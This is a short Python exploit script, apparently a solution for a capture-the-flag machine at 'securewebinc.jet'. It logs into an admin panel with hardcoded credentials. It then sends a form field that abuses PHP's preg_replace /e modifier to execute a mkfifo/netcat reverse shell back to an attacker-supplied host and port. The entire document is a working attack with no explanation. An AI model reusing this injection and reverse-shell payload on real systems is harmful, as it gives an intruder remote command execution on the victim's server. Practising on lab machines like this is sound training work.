#!/usr/bin/python3
import requests, sys
from pwn import log

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <lhost> <lport>")
    sys.exit(1)

target = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin"
session = requests.Session()

auth = {"username": "admin", "password": "Hackthesystem200"}
data = {"swearwords[/fuck/e]": f"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {sys.argv[1]} {sys.argv[2]} >/tmp/f')", "to": "test@test.com", "subject": "test", "message": "fuck", "_wysihtml5_mode": 1}

session.post(target + "/dologin.php", data=auth)
session.post(target + "/email.php", data=data)
